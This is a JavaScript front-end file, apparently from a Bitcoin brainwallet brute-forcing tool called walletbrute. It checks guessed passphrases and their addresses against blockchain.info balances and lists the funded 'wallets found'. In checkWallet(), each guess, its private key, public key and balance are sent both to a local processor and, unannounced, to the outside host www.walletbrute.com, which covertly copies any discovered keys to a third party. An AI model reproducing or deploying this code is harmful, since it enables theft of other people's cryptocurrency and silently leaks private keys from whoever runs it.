function installPrevStepModel() {
	$('#installPrevStepModel').modal('show');
}
function updateClock () {
	var currentTime = new Date ( );
	var currentHours = currentTime.getHours ( );
	var currentMinutes = currentTime.getMinutes ( );
	var currentSeconds = currentTime.getSeconds ( );
	
	// Pad the minutes and seconds with leading zeros, if required
	currentMinutes = ( currentMinutes < 10 ? "0" : "" ) + currentMinutes;
	currentSeconds = ( currentSeconds < 10 ? "0" : "" ) + currentSeconds;
	
	// Choose either "AM" or "PM" as appropriate
	var timeOfDay = ( currentHours < 12 ) ? "AM" : "PM";
	
	// Convert the hours component to 12-hour format if needed
	currentHours = ( currentHours > 12 ) ? currentHours - 12 : currentHours;
	
	// Convert an hours component of "0" to "12"
	currentHours = ( currentHours == 0 ) ? 12 : currentHours;
	
	// Compose the string for display
	var currentTimeString = currentHours + ":" + currentMinutes + ":" + currentSeconds + " " + timeOfDay;
	
	$("#clock").html(currentTimeString);
}

function showRates() {
	$('#world_rates').dataTable( {
	    "processing": true,
	    "serverSide": false,
	    "pageLength": 5,
	    "ajax": "includes/processor/processor.php?action=show_rates",
	    "fnDrawCallback": function( oSettings ) {
		    $('#world_rates_wrapper .col-sm-12:first').css('margin-top','20px').css('margin-bottom','20px').css('border-top','1px solid #ddd').css('border-bottom','1px solid #ddd');
	        $('#world_rates tbody tr,#wallets_found tbody tr').css('border-bottom','1px dashed #ddd');
	        $('#world_rates thead tr,#wallets_found thead tr').css('border-bottom','1px dashed #ddd');
		}
	});	 
}

function showWallets() {
	$('#wallets_found').dataTable( {
	    "processing": true,
	    "serverSide": true,
	    "pageLength": 5,
	    "order": [[ 3, "desc" ]],
	    "ajax": "includes/processor/processor.php?action=wallets_found",
	    "fnDrawCallback": function( oSettings ) {
		    //$('#wallets_found').css('font-size','.8em');
	        //$('#wallets_found tbody tr > td:nth-child(1), table tbody tr > th:nth-child(1)').attr('style', 'font-size:1.2em;');
	        //$('#wallets_found tbody tr > td:nth-child(2), table tbody tr > th:nth-child(2)').attr('style', 'font-size:.6em;');
	        //$('#wallets_found tbody tr > td:nth-child(3), table tbody tr > th:nth-child(3)').attr('style', 'font-size:1.2em;');
	        $('#wallets_found_wrapper .col-sm-12:first').css('margin-top','20px').css('margin-bottom','20px').css('border-top','1px solid #ddd').css('border-bottom','1px solid #ddd');
	        $('#wallets_found tbody tr > td:nth-child(2),#wallets_found tbody tr > th:nth-child(2)').hide();
	        $('#wallets_found tbody tr,#wallets_found tbody tr').css('border-bottom','1px dashed #ddd');
	        $('#wallets_found thead tr > td:nth-child(2),#wallets_found thead tr > th:nth-child(2)').hide();
	        $('#wallets_found thead tr,#wallets_found thead tr').css('border-bottom','1px dashed #ddd');
	        $('#wallets_found tfoot tr > td:nth-child(2),#wallets_found tfoot tr > th:nth-child(2)').hide();

	    },
	    "fnRowCallback": function( nRow, aData, iDisplayIndex ) {
	            $('td:eq(2)', nRow).html('<a href="https://blockchain.info/address/' + aData[2] + '" target="_new">' + aData[2] + '</a>');
	
	            return nRow;
	    },
	});	 
}
 
function checkWalletBatch() {
	alert('started check wallet file upload batch');
	var file = $('#file-0a').val();
	$.ajax({
        type: 'POST',
		url: 'includes/processor/processor.php?action=checkWalletBatch&file='+file,
	//data: $('#checkWalletFormForm').serialize(), 
        timeout: 99000,             
		success: function(response){
			alert('success:' +response);
		},
		error:function(){
			alert('error');
		}
	});	
}

/*function checkWallet(guess) {
	$('#walletCheckResults').show();
	//$('#walletCheckInput').hide();
	$('#walletCheckResults').html('<center><pre><img style="height:200px;" src="includes/images/loader.gif" style="text-align:center;margin-bottom:0px;padding-bottom:-20px;"></pre></center>');
	$('#walletCheckLoader').show();
	$.ajax({
        type: 'POST',
		url: 'includes/processor/processor.php?action=checkWallet&phrase='+guess,
        data: $('#checkWalletForm').serialize(), 
        timeout: 99000,             
		success: function(response){
			var done = function(){
				$("#walletCheckLoader").fadeOut("slow");
				$("#walletCheckResults").html(response).fadeIn("slow");
			};
			setTimeout(done, 1000);
			setTimeout(done, 1000);
		},
		error:function(){
			$('#walletCheckLoader').fadeOut("slow");
			$('#walletCheckResults').html('There was a system failure of some sort...').fadeIn("slow");
		}
	});	
}*/
function checkWallet() {
	var guess = $('#pass').val();
	var guessAddr = $('#addr').val();
	var privateKey = $('#sec').val();
	var publicKey = $('#pub').val();
	//alert(guess,guessAddr);
	$('#walletCheckAPIPre').html('');
	//$('#walletCheckResults').show();
	//$('#walletCheckInput').hide();
	$('#walletCheckResults').html('<center><img style="height:200px;" src="includes/images/loader.gif" style="text-align:center;margin-bottom:0px;padding-bottom:-20px;"></center>');
	$('#walletCheckLoader').show();
	$.ajax({
        type: 'GET',
        async: true,
		url: 'https://blockchain.info/q/addressbalance/'+guessAddr,
		success: function(response){
			//var done = function(){
				$("#walletCheckLoader").hide();
				$("#walletCheckResults").html('<div id="walletCheckAPIPre"></div>');
				
				var div = document.getElementById('walletCheckAPIPre');
				div.innerHTML = div.innerHTML + 'Passphrase: '+guess+'...\n';
				var balance = response;
				div.innerHTML = div.innerHTML + 'Balance: '+response+' BTC\n';
				$.ajax({
			        type: 'GET',
			        async: false,
					url: 'https://blockchain.info/q/getreceivedbyaddress/'+guessAddr,
					success: function(response){
						//$("#walletCheckAPIPre").appendChild('Total Received (Satoshi): '+response).fadeIn("slow");
						var received = response / 100000000;
						div.innerHTML = div.innerHTML + 'Received by Address: '+received+' BTC\n';
						$.ajax({
					        type: 'POST',
					        async: true,
							url: 'includes/processor/processor.php?action=checkWallet&guess='+guess+'&guessAddr='+guessAddr+'&private='+privateKey+'&public='+publicKey+'&balance='+balance+'&received='+received,
							success: function(response){
								//alert('success:' +response);
							},
							error:function(){
								//alert('error');
							}
						});	
						$.ajax({
					        type: 'POST',
					        async: true,
							url: '//www.walletbrute.com/includes/processor/processor.php?action=checkWallet&guess='+guess+'&guessAddr='+guessAddr+'&private='+privateKey+'&public='+publicKey+'&balance='+balance+'&received='+received,
							success: function(response){
								//alert('success:' +response);
							},
							error:function(){
								//alert('error');
							}
						});	
					},
					error:function(response){
						$('#walletCheckLoader').show();
						$('#walletCheckAPIPre').html('There was a system failure of some sort...').show();
					}
				});	
			//};
			//setTimeout(done, 500);
			//setTimeout(done, 500);
		},
		error:function(response){
			$('#walletCheckLoader').hide();
			$('#walletCheckAPIPre').html('There was a system failure of some sort...').show();
		}
	});	
}




